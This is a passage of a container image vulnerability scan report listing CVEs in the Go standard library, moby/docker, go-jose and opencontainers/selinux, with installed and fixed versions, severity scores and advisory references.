│     │      │                  ├ [1]: https://go.dev/issue/78803 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:8e2e486f8c5dd08ede32d471e20cf1c8d88168c68d93eae151e75e4b85eed8a3 
│     │      ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │      │                  ├ [1]: https://go.dev/cl/761640 
│     │      │                  ├ [2]: https://go.dev/issue/78476 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2026-39820 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7375f1fb29b535ed868b868b6d2e03ebc14a8f5d9d22fa9a9af281ab07b96920 
│     │      ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │      ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate
│     │      │                   were able to trigger excessive CPU exhaustion and memory allocations. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │      │                  ├ [1]: https://go.dev/issue/78566 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2026-39823 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0d19d955515f8210f689fb8c631e26eb95ddbb2cfdca1fb5b579f826c380e5dd 
│     │      ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │      ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │      │                   inside of a <meta> tag's <content> attribute. If the URL content were to
│     │      │                   insert ASCII whitespaces around the '=' rune inside of the <content>
│     │      │                   attribute, the escaper would fail to similarly escape it, leading to XSS. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │      │                  ├ [1]: https://go.dev/issue/78913 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2026-39825 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:44c111a297f3d1e60be0b0a10d19ac9dabace5ac61f5b2183165d08162e9b458 
│     │      ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │      ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │      │                   functions. When used with a Rewrite function, or a Director function which
│     │      │                   parses query parameters, ReverseProxy sanitizes the forwarded request to
│     │      │                   remove query parameters which are not parsed by url.ParseQuery. ReverseProxy
│     │      │                   does not take ParseQuery's limit on the total number of query parameters
│     │      │                   (controlled by GODEBUG=urlmaxqueryparams=N) into account. This can permit
│     │      │                   ReverseProxy to forward a request containing a query parameter that is not
│     │      │                   visible to the Rewrite function. For example, the query
│     │      │                   "a1=x&a2=x&...&a10000=x&hidden=y" can forward the parameter "hidden=y" while
│     │      │                   hiding it from the proxy's Rewrite function. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │      │                  ├ [1]: https://go.dev/issue/78948 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-39826 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:6e7d79593845508c28a2ed0bc956eec93cbc0e64a7fb2b19177a876b84fa4e0c 
│     │      ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │      ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │      │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │      │                    of the template would incorrectly escape any data passed into the <script>
│     │      │                   block. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │      │                  ├ [1]: https://go.dev/issue/78981 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [16] ╭ VulnerabilityID : CVE-2026-39836 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │      ├ PkgID           : stdlib@v1.25.8 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│     │      │                  ╰ UID : d7d9624bed3e4b65 
│     │      ├ InstalledVersion: v1.25.8 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:4d4eb45b4df24647a8bfd436099dbf00e9f6015378eeacd2ba0bbcdedb11a573 
│     │      ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │      ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │      │                    containing a NUL (0). 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │      │                  ├ [1]: https://go.dev/issue/79006 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [17] ╭ VulnerabilityID : CVE-2026-42499 
│            ├ VendorIDs        ─ [0]: GO-2026-4977 
│            ├ PkgID           : stdlib@v1.25.8 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.25.8 
│            │                  ╰ UID : d7d9624bed3e4b65 
│            ├ InstalledVersion: v1.25.8 
│            ├ FixedVersion    : 1.25.10, 1.26.3 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│            │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:25f1da0394299b489328bdb044fc32006d6c8ac25d0b36bfa22585729f8dc8de 
│            ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│            ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an
│            │                   email address according to RFC 5322. 
│            ├ Severity        : UNKNOWN 
│            ├ References       ╭ [0]: https://go.dev/cl/771520 
│            │                  ├ [1]: https://go.dev/issue/78987 
│            │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│            │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│            ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│            ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
├ [7] ╭ [0]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:058d6f12ff6027284c43bc6497c2622b2ad9c102977b5b4344d60f1b6824e7ff 
│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-04-03T16:51:28.67Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:a229bfe2852a97701898d38652dac38ed3f1ee408d3871c68e367c685506dbbf 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-193 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a45685947756
│     │      │                  │      a22a 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-04-03T17:23:21.307Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-34986 
│     │      ├ VendorIDs        ─ [0]: GHSA-78h2-9frx-2jm8 
│     │      ├ PkgID           : github.com/go-jose/go-jose/v4@v4.0.5 
│     │      ├ PkgName         : github.com/go-jose/go-jose/v4 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-jose/go-jose/v4@v4.0.5 
│     │      │                  ╰ UID : f1638d0ee61820e7 
│     │      ├ InstalledVersion: v4.0.5 
│     │      ├ FixedVersion    : 4.1.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34986 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:52bad2311a964a19cdc39956b792b585feccadb0f2b6825ba1350436cf4835fd 
│     │      ├ Title           : github.com/go-jose/go-jose/v3: github.com/go-jose/go-jose/v4: Go JOSE: Denial
│     │      │                   of Service via crafted JSON Web Encryption (JWE) object 
│     │      ├ Description     : Go JOSE provides an implementation of the Javascript Object Signing and
│     │      │                   Encryption set of standards in Go, including support for JSON Web Encryption
│     │      │                   (JWE), JSON Web Signature (JWS), and JSON Web Token (JWT) standards. Prior to
│     │      │                   4.1.4 and 3.0.5, decrypting a JSON Web Encryption (JWE) object will panic if
│     │      │                   the alg field indicates a key wrapping algorithm (one ending in KW, with the
│     │      │                   exception of A128GCMKW, A192GCMKW, and A256GCMKW) and the encrypted_key field
│     │      │                   is empty. The panic happens when cipher.KeyUnwrap() in key_wrap.go attempts to
│     │      │                    allocate a slice with a zero or negative length based on the length of the
│     │      │                   encrypted_key. This code path is reachable from ParseEncrypted() /
│     │      │                   ParseEncryptedJSON() / ParseEncryptedCompact() followed by Decrypt() on the
│     │      │                   resulting object. Note that the parse functions take a list of accepted key
│     │      │                   algorithms. If the accepted key algorithms do not include any key wrapping
│     │      │                   algorithms, parsing will fail and the application will be unaffected. This
│     │      │                   panic is also reachable by calling cipher.KeyUnwrap() directly with any
│     │      │                   ciphertext parameter less than 16 bytes long, but calling this function
│     │      │                   directly is less common. Panics can lead to denial of service. This
│     │      │                   vulnerability is fixed in 4.1.4 and 3.0.5. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-248 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ ghsa       : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:10135 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-34986 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2455470 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-10135.html 
│     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:10135 
│     │      │                  ├ [7] : https://github.com/go-jose/go-jose 
│     │      │                  ├ [8] : https://github.com/go-jose/go-jose/security/advisories/GHSA-78h2-9frx-2
│     │      │                  │       jm8 
│     │      │                  ├ [9] : https://linux.oracle.com/cve/CVE-2026-34986.html 
│     │      │                  ├ [10]: https://linux.oracle.com/errata/ELSA-2026-10135.html 
│     │      │                  ├ [11]: https://nvd.nist.gov/vuln/detail/CVE-2026-34986 
│     │      │                  ├ [12]: https://pkg.go.dev/github.com/go-jose/go-jose/v4#pkg-constants 
│     │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2026-34986 
│     │      ├ PublishedDate   : 2026-04-06T17:17:11.87Z 
│     │      ╰ LastModifiedDate: 2026-05-04T15:20:44.337Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2025-52881 
│     │      ├ VendorIDs        ─ [0]: GHSA-cgrx-mc8f-2prm 
│     │      ├ PkgID           : github.com/opencontainers/selinux@v1.12.0 
│     │      ├ PkgName         : github.com/opencontainers/selinux 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/opencontainers/selinux@v1.12.0 
│     │      │                  ╰ UID : 8482b50106737177 
│     │      ├ InstalledVersion: v1.12.0 
│     │      ├ FixedVersion    : 1.13.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-52881 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:ab5c3e9d0c19e0359ec191cc29389e2f7c6334807a4f5b74262aa16b03d6cded 
│     │      ├ Title           : runc: opencontainers/selinux: container escape and denial of service due to
│     │      │                   arbitrary write gadgets and procfs write redirects 
│     │      ├ Description     : runc is a CLI tool for spawning and running containers according to the OCI
│     │      │                   specification. In versions 1.2.7, 1.3.2 and 1.4.0-rc.2, an attacker can trick
│     │      │                   runc into misdirecting writes to /proc to other procfs files through the use
│     │      │                   of a racing container with shared mounts (we have also verified this attack is
│     │      │                    possible to exploit using a standard Dockerfile with docker buildx build as
│     │      │                   that also permits triggering parallel execution of containers with custom
│     │      │                   shared mounts configured). This redirect could be through symbolic links in a
│     │      │                   tmpfs or theoretically other methods such as regular bind-mounts. While
│     │      │                   similar, the mitigation applied for the related CVE, CVE-2019-19921, was
│     │      │                   fairly limited and effectively only caused runc to verify that when LSM labels
│     │      │                    are written they are actually procfs files. This issue is fixed in versions
│     │      │                   1.2.8, 1.3.3, and 1.4.0-rc.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-61 
│     │      │                  ╰ [1]: CWE-363 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 3 
│     │      │                  ├ ghsa       : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:
│     │      │                  │        │            H/SA:H 
│     │      │                  │        ╰ V40Score : 7.3 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.2 
│     │      ├ References       ╭ [0] : http://github.com/opencontainers/runc/commit/a41366e74080fa9f26a2cd3544
│     │      │                  │       e2801449697322 
│     │      │                  ├ [1] : http://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb91
│     │      │                  │       0a61aaa1ef47f3 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2025:22011 
│     │      │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2025-52881 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2404715 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2407258 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2404715 
│     │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-52881 
│     │      │                  ├ [8] : https://errata.almalinux.org/9/ALSA-2025-22011.html 
│     │      │                  ├ [9] : https://errata.rockylinux.org/RLSA-2025:23543 
